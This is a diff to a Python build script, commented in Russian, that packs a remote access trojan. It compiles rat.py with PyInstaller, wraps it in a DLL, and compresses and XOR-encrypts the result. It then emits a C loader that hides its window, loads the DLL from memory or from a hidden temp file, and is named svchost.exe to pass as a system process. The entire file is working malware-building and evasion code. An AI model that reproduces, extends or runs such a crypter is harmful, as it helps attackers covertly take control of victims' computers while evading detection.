@@ -1,4 +1,3 @@
-# build.py - СБОРКА ЧЕРЕЗ РЕСУРСЫ WINDOWS
 import os
 import sys
 import subprocess
@@ -6,7 +5,6 @@ import random
 import zlib
 import shutil
 import time
-import struct
 
 class StealthBuilder:
     def __init__(self, token, admin_id):
@@ -16,7 +14,6 @@ class StealthBuilder:
         
     def build_exe_with_pyinstaller(self):
         print("[+] Building EXE with PyInstaller...")
-        start = time.time()
         
         cmd = [
             "pyinstaller",
@@ -47,9 +44,6 @@ class StealthBuilder:
         ]
         
         result = subprocess.run(cmd, capture_output=True)
-        elapsed = int(time.time() - start)
-        print(f"[+] PyInstaller completed in {elapsed}s")
-            
         if result.returncode != 0:
             print(f"[-] PyInstaller error: {result.stderr.decode()}")
             return None
@@ -71,59 +65,21 @@ class StealthBuilder:
         return "payload.exe"
     
     def create_dll_from_exe(self, exe_path):
-        """Создает DLL из EXE через простую обертку"""
         print("[+] Creating DLL from EXE...")
-        start = time.time()
         
-        # Читаем EXE
         with open(exe_path, 'rb') as f:
             exe_data = f.read()
         
-        # Создаем .rc файл с ресурсами
-        rc_content = '''
-#include <windows.h>
-
-PAYLOAD_DATA RCDATA "payload.bin"
-'''
-        with open('payload.rc', 'w') as f:
-            f.write(rc_content)
-        
-        # Сохраняем EXE как бинарный ресурс
-        with open('payload.bin', 'wb') as f:
-            f.write(exe_data)
-        
-        # Компилируем ресурс в .res
-        cmd = ['windres', '-i', 'payload.rc', '-o', 'payload.res']
-        result = subprocess.run(cmd, capture_output=True)
-        if result.returncode != 0:
-            print(f"[-] windres error: {result.stderr.decode()}")
-            return None
-        
-        # Создаем DLL обертку
+        # Простой C код без спецсимволов
         dll_code = '''
 #include <windows.h>
 #include <stdio.h>
 #include <stdlib.h>
 
-// Ресурс с EXE
-extern "C" {
-    extern unsigned char payload_bin[];
-    extern unsigned int payload_bin_len;
-}
+static unsigned char exe_data[] = {DATA};
+static unsigned int exe_size = SIZE;
 
 static void RunEXE() {
-    // Получаем ресурс
-    HRSRC hRes = FindResourceA(NULL, MAKEINTRESOURCEA(1), "RCDATA");
-    if (!hRes) return;
-    
-    HGLOBAL hData = LoadResource(NULL, hRes);
-    if (!hData) return;
-    
-    DWORD exe_size = SizeofResource(NULL, hRes);
-    unsigned char* exe_data = (unsigned char*)LockResource(hData);
-    if (!exe_data) return;
-    
-    // Сохраняем во временный файл
     char temp_path[MAX_PATH];
     char exe_path[MAX_PATH];
     DWORD written;
@@ -161,109 +117,98 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
     return TRUE;
 }
 '''
-        with open('payload_dll.cpp', 'w') as f:
-            f.write(dll_code)
+        # Генерируем HEX данные
+        hex_parts = []
+        for i, b in enumerate(exe_data):
+            if i % 16 == 0:
+                hex_parts.append('\n    ')
+            hex_parts.append(f'0x{b:02X}, ')
         
-        # Компилируем DLL с ресурсом
+        hex_string = ''.join(hex_parts).rstrip(', ')
+        
+        # Заменяем плейсхолдеры
+        final_code = dll_code.replace('{DATA}', hex_string)
+        final_code = final_code.replace('{SIZE}', str(len(exe_data)))
+        
+        # Сохраняем как ASCII
+        with open('payload_dll.c', 'w', encoding='ascii', errors='ignore') as f:
+            f.write(final_code)
+        
+        # Компилируем DLL
         cmd = [
-            'g++',
-            '-shared',
-            '-o', 'payload.dll',
-            'payload_dll.cpp',
-            'payload.res',
-            '-static',
-            '-s',
-            '-O2',
+            'gcc', '-shared', '-o', 'payload.dll',
+            'payload_dll.c',
+            '-static', '-s', '-O2',
             '-Wl,--subsystem,windows',
             '-luser32', '-lkernel32'
         ]
         
         result = subprocess.run(cmd, capture_output=True)
         if result.returncode != 0:
-            print(f"[-] DLL compilation error: {result.stderr.decode()}")
+            print(f"[-] DLL error: {result.stderr.decode()}")
             return None
-        
-        elapsed = int(time.time() - start)
+            
         size_mb = os.path.getsize('payload.dll') / (1024*1024)
-        print(f"[+] DLL ready! Size: {size_mb:.1f} MB (in {elapsed}s)")
+        print(f"[+] DLL ready! Size: {size_mb:.1f} MB")
         return "payload.dll"
     
-    def encrypt_dll_and_build_loader(self, dll_path):
-        """Шифрует DLL и создает загрузчик"""
+    def encrypt_and_build_loader(self, dll_path):
         print("[+] Encrypting DLL...")
-        start = time.time()
         
         with open(dll_path, 'rb') as f:
             dll_data = f.read()
         
-        # Сжимаем
-        print(f"    [1/3] Compressing {len(dll_data)/(1024*1024):.1f} MB...")
         compressed = zlib.compress(dll_data, level=9)
-        print(f"    [2/3] Compressed to {len(compressed)/(1024*1024):.1f} MB")
         
-        # XOR шифруем
-        print(f"    [3/3] XOR encrypting...")
         encrypted = bytearray(compressed)
         for i in range(len(encrypted)):
             encrypted[i] ^= self.xor_key[i % len(self.xor_key)]
-            if i % (1024*1024) == 0:
-                print(f"\r    [3/3] Encrypting... {i*100//len(encrypted)}%", end="")
-        print(f"\r    [3/3] Encrypted! {len(encrypted)/(1024*1024):.1f} MB    ")
         
-        # Сохраняем зашифрованную DLL
         with open('encrypted.bin', 'wb') as f:
             f.write(encrypted)
-        
-        # Сохраняем ключ
         with open('key.bin', 'wb') as f:
             f.write(self.xor_key)
         
-        elapsed = int(time.time() - start)
-        print(f"[+] Encrypted! Size: {len(encrypted)/(1024*1024):.1f} MB (in {elapsed}s)")
+        size_mb = len(encrypted) / (1024*1024)
+        print(f"[+] Encrypted! Size: {size_mb:.1f} MB")
         
-        # Создаем .rc файл для загрузчика
-        print("[+] Creating loader resources...")
-        
-        rc_content = '''
-#include <windows.h>
-
-ENCRYPTED_DATA RCDATA "encrypted.bin"
-KEY_DATA RCDATA "key.bin"
-'''
-        with open('loader.rc', 'w') as f:
-            f.write(rc_content)
-        
-        # Компилируем ресурсы
-        cmd = ['windres', '-i', 'loader.rc', '-o', 'loader.res']
-        result = subprocess.run(cmd, capture_output=True)
-        if result.returncode != 0:
-            print(f"[-] windres error: {result.stderr.decode()}")
-            return None
-        
-        # Создаем загрузчик
+        # Создаем загрузчик с встроенными данными (маленький массив)
         print("[+] Creating loader...")
         
-        loader_code = '''
+        # Конвертируем зашифрованные данные в C массив
+        enc_hex = []
+        for i, b in enumerate(encrypted):
+            if i % 16 == 0:
+                enc_hex.append('\n    ')
+            enc_hex.append(f'0x{b:02X}, ')
+        enc_string = ''.join(enc_hex).rstrip(', ')
+        
+        key_hex = []
+        for i, b in enumerate(self.xor_key):
+            if i % 16 == 0:
+                key_hex.append('\n    ')
+            key_hex.append(f'0x{b:02X}, ')
+        key_string = ''.join(key_hex).rstrip(', ')
+        
+        loader_code = f'''
 #include <windows.h>
 #include <stdio.h>
 #include <stdlib.h>
 
-// Ресурсы
-extern "C" {
-    extern unsigned char encrypted_bin[];
-    extern unsigned int encrypted_bin_len;
-    extern unsigned char key_bin[];
-    extern unsigned int key_bin_len;
-}
+static unsigned char encrypted_dll[] = {{{enc_string}}};
+static unsigned int dll_len = {len(encrypted)};
+
+static unsigned char xor_key[] = {{{key_string}}};
+static unsigned int key_len = {len(self.xor_key)};
 
 static void xor_decrypt(unsigned char* data, unsigned int len, 
-                        unsigned char* key, unsigned int key_len) {
-    for (unsigned int i = 0; i < len; i++) {
+                        unsigned char* key, unsigned int key_len) {{
+    for (unsigned int i = 0; i < len; i++) {{
         data[i] ^= key[i % key_len];
-    }
-}
+    }}
+}}
 
-static bool LoadDLLFromMemory(unsigned char* dll_data, unsigned int dll_size) {
+static bool LoadDLLFromMemory(unsigned char* dll_data, unsigned int dll_size) {{
     if (dll_data[0] != 'M' || dll_data[1] != 'Z') return false;
     
     void* dll_memory = VirtualAlloc(NULL, dll_size, 
@@ -282,55 +227,31 @@ static bool LoadDLLFromMemory(unsigned char* dll_data, unsigned int dll_size) {
     
     HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)dll_main, 
                                   dll_memory, 0, NULL);
-    if (hThread) {
+    if (hThread) {{
         CloseHandle(hThread);
         return true;
-    }
+    }}
     
     return dll_main((HINSTANCE)dll_memory, DLL_PROCESS_ATTACH, NULL) == TRUE;
-}
+}}
 
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, 
-                   LPSTR lpCmdLine, int nCmdShow) {
+                   LPSTR lpCmdLine, int nCmdShow) {{
     ShowWindow(GetConsoleWindow(), SW_HIDE);
     
     HANDLE hMutex = CreateMutexA(NULL, FALSE, "Global\\\\RatMutex_7F3A8B2C");
     if (GetLastError() == ERROR_ALREADY_EXISTS) return 0;
     
-    // Получаем зашифрованную DLL из ресурсов
-    HRSRC hEncRes = FindResourceA(NULL, MAKEINTRESOURCEA(1), "RCDATA");
-    if (!hEncRes) return 1;
-    
-    HGLOBAL hEncData = LoadResource(NULL, hEncRes);
-    if (!hEncData) return 1;
-    
-    unsigned int enc_size = SizeofResource(NULL, hEncRes);
-    unsigned char* enc_data = (unsigned char*)LockResource(hEncData);
-    if (!enc_data) return 1;
-    
-    // Получаем ключ из ресурсов
-    HRSRC hKeyRes = FindResourceA(NULL, MAKEINTRESOURCEA(2), "RCDATA");
-    if (!hKeyRes) return 1;
-    
-    HGLOBAL hKeyData = LoadResource(NULL, hKeyRes);
-    if (!hKeyData) return 1;
-    
-    unsigned int key_size = SizeofResource(NULL, hKeyRes);
-    unsigned char* key_data = (unsigned char*)LockResource(hKeyData);
-    if (!key_data) return 1;
-    
-    // Расшифровываем
-    unsigned char* decrypted = (unsigned char*)malloc(enc_size);
+    unsigned char* decrypted = (unsigned char*)malloc(dll_len);
     if (!decrypted) return 1;
     
-    memcpy(decrypted, enc_data, enc_size);
-    xor_decrypt(decrypted, enc_size, key_data, key_size);
+    memcpy(decrypted, encrypted_dll, dll_len);
     
-    // Загружаем DLL
-    bool success = LoadDLLFromMemory(decrypted, enc_size);
+    xor_decrypt(decrypted, dll_len, xor_key, key_len);
     
-    // Если не получилось - через временный файл
-    if (!success) {
+    bool success = LoadDLLFromMemory(decrypted, dll_len);
+    
+    if (!success) {{
         char temp_path[MAX_PATH];
         char dll_path[MAX_PATH];
         GetTempPathA(MAX_PATH, temp_path);
@@ -338,40 +259,35 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
         
         HANDLE hFile = CreateFileA(dll_path, GENERIC_WRITE, 0, NULL,
                                    CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
-        if (hFile != INVALID_HANDLE_VALUE) {
+        if (hFile != INVALID_HANDLE_VALUE) {{
             DWORD written;
-            WriteFile(hFile, decrypted, enc_size, &written, NULL);
+            WriteFile(hFile, decrypted, dll_len, &written, NULL);
             CloseHandle(hFile);
             LoadLibraryA(dll_path);
             Sleep(3000);
             DeleteFileA(dll_path);
-        }
-    }
+        }}
+    }}
     
     free(decrypted);
     
     while (1) Sleep(10000);
     return 0;
-}
+}}
 '''
-        with open('loader_final.cpp', 'w') as f:
+        with open('loader_final.cpp', 'w', encoding='ascii', errors='ignore') as f:
             f.write(loader_code)
         
         print("[+] Loader ready!")
         return 'loader_final.cpp'
     
     def compile_loader(self, loader_path):
-        """Компилирует финальный EXE с ресурсами"""
         print("[+] Compiling final EXE...")
-        print("[!] This takes 2-4 minutes, please wait...")
-        start = time.time()
         
-        # Компилируем загрузчик с ресурсами
         cmd = [
             'g++',
             '-o', 'svchost.exe',
             loader_path,
-            'loader.res',
             '-static',
             '-s',
             '-O1',
@@ -379,31 +295,9 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
             '-luser32', '-lkernel32'
         ]
         
-        # Показываем анимацию
-        chars = ['|', '/', '-', '\\']
-        i = 0
-        
-        process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
-        
-        while True:
-            line = process.stdout.readline()
-            if not line:
-                break
-            if line.strip():
-                elapsed = int(time.time() - start)
-                print(f"    [{elapsed}s] {line.strip()}")
-            
-            elapsed = int(time.time() - start)
-            print(f"\r[{chars[i % len(chars)]}] Compiling... {elapsed}s", end="")
-            i += 1
-            time.sleep(0.1)
-        
-        process.wait()
-        elapsed = int(time.time() - start)
-        print(f"\r[+] Compilation completed in {elapsed}s    ")
-        
-        if process.returncode != 0:
-            print("[-] Compilation failed!")
+        result = subprocess.run(cmd, capture_output=True)
+        if result.returncode != 0:
+            print(f"[-] Error: {result.stderr.decode()}")
             return None
         
         size_kb = os.path.getsize('svchost.exe') / 1024
@@ -411,11 +305,8 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
         return 'svchost.exe'
     
     def build(self):
-        print("=" * 60)
         print("[+] STARTING STEALTH RAT BUILD")
         print("=" * 60)
-        print()
-        total_start = time.time()
         
         print("[+] Updating rat.py...")
         with open('rat.py', 'r', encoding='utf-8') as f:
@@ -424,39 +315,28 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
         content = content.replace('{{ADMIN_ID}}', str(self.admin_id))
         with open('rat.py', 'w', encoding='utf-8') as f:
             f.write(content)
-        print("[+] rat.py updated!")
-        print()
         
         exe = self.build_exe_with_pyinstaller()
         if not exe:
             return False
         
-        print()
         dll = self.create_dll_from_exe(exe)
         if not dll:
             return False
         
-        print()
-        loader = self.encrypt_dll_and_build_loader(dll)
+        loader = self.encrypt_and_build_loader(dll)
         if not loader:
             return False
         
-        print()
         final_exe = self.compile_loader(loader)
         
         if final_exe:
-            total_elapsed = int(time.time() - total_start)
-            minutes = total_elapsed // 60
-            seconds = total_elapsed % 60
-            print()
             print("=" * 60)
             print("[+] BUILD COMPLETED SUCCESSFULLY!")
-            print(f"[+] Total time: {minutes}m {seconds}s")
             print(f"[+] FINAL EXE: {final_exe} ({os.path.getsize(final_exe) / 1024:.1f} KB)")
             print(f"[+] Original EXE: {exe} ({os.path.getsize(exe) / (1024*1024):.1f} MB)")
             print(f"[+] DLL: {dll} ({os.path.getsize(dll) / (1024*1024):.1f} MB)")
             print(f"[+] Key: {self.xor_key.hex()}")
-            print("=" * 60)
             
             with open('key.txt', 'w') as f:
                 f.write(self.xor_key.hex())
